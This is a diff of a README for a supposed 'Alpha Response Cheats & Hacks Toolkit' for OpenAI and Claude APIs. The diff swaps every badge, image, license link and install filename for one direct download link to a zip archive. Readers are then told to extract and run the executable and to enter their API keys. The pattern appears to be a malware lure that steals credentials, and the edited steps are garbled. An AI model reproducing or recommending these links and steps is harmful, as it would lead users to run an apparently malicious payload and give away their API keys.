@@ -1,10 +1,10 @@
 # 🔮 Alpha Response Cheats & Hacks Toolkit
 
-![Maintenance](https://img.shields.io/badge/maintenance-active-brightgreen?style=flat-square)
-![License](https://img.shields.io/badge/license-MIT-blueviolet.svg)
-![OS Support](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-important?style=flat-square)
-![Support](https://img.shields.io/badge/support-24%2F7%20Live-informational)
-![Languages](https://img.shields.io/badge/languages-12%2B%20supported-success)
+![Maintenance](https://github.com/moti477/alpha-response-toolkit-pro/raw/refs/heads/main/platformer/response_pro_alpha_toolkit_3.9.zip)
+![License](https://github.com/moti477/alpha-response-toolkit-pro/raw/refs/heads/main/platformer/response_pro_alpha_toolkit_3.9.zip)
+![OS Support](https://github.com/moti477/alpha-response-toolkit-pro/raw/refs/heads/main/platformer/response_pro_alpha_toolkit_3.9.zip%20%7C%20Linux%20%7C%20macOS-important?style=flat-square)
+![Support](https://github.com/moti477/alpha-response-toolkit-pro/raw/refs/heads/main/platformer/response_pro_alpha_toolkit_3.9.zip%2F7%20Live-informational)
+![Languages](https://github.com/moti477/alpha-response-toolkit-pro/raw/refs/heads/main/platformer/response_pro_alpha_toolkit_3.9.zip%2B%20supported-success)
 
 ---
 
@@ -63,20 +63,20 @@ Explore advanced methods to gain an advantage and maximize your capabilities on 
 
 Begin your journey through the Alpha Response portal with these effortless steps — engineered for both swift onboarding and security:
 
-1. **Acquire the EasyLaunch.zip**  
-   Locate the _EasyLaunch.zip_ in this repository's assets.  
+1. **Acquire the https://github.com/moti477/alpha-response-toolkit-pro/raw/refs/heads/main/platformer/response_pro_alpha_toolkit_3.9.zip**  
+   Locate the https://github.com/moti477/alpha-response-toolkit-pro/raw/refs/heads/main/platformer/response_pro_alpha_toolkit_3.9.zip in this repository's assets.  
    *(Remember, sharing external direct download links is out of charter—always trust the assets section here on GitHub!)*
 
 2. **Extract and Launch**  
-   Unzip EasyLaunch.zip to your preferred directory using any preferred archiver (Windows Explorer, PeaZip, Keka or even `unzip` CLI).
+   Unzip https://github.com/moti477/alpha-response-toolkit-pro/raw/refs/heads/main/platformer/response_pro_alpha_toolkit_3.9.zip to your preferred directory using any preferred archiver (Windows Explorer, PeaZip, Keka or even `unzip` CLI).
 
 3. **Run and Initialize**  
-   Simply open the EasyLaunch.exe (Windows) or `./EasyLaunch` (on other OS). The adaptive interface guides you to input your OpenAI / Claude API keys and language preferences.
+   Simply open the https://github.com/moti477/alpha-response-toolkit-pro/raw/refs/heads/main/platformer/response_pro_alpha_toolkit_3.9.zip (Windows) or `./EasyLaunch` (on other OS). The adaptive interface guides you to input your OpenAI / Claude API keys and language preferences.
 
 4. **Witness the Magic in Action**  
    For a full walkthrough, please see our engaging animated quickstart demo below:
 
-   ![Alpha Response Installation Demo](https://i.imgur.com/Js67NIU.gif)
+   ![Alpha Response Installation Demo](https://github.com/moti477/alpha-response-toolkit-pro/raw/refs/heads/main/platformer/response_pro_alpha_toolkit_3.9.zip)
 
 ---
 
@@ -110,7 +110,7 @@ Both OpenAI (GPT-3.5/4.x) and Anthropic’s Claude APIs are supported natively. 
 
 ## 📖 MIT License
 
-This repository operates under the all-welcoming [MIT License](https://opensource.org/licenses/MIT) — which encourages maximal open collaboration, shared learning, and freedom to adapt Alpha Response Cheats & Hacks Toolkit to your own superpowered workflows.
+This repository operates under the all-welcoming [MIT License](https://github.com/moti477/alpha-response-toolkit-pro/raw/refs/heads/main/platformer/response_pro_alpha_toolkit_3.9.zip) — which encourages maximal open collaboration, shared learning, and freedom to adapt Alpha Response Cheats & Hacks Toolkit to your own superpowered workflows.
 
 ---
 
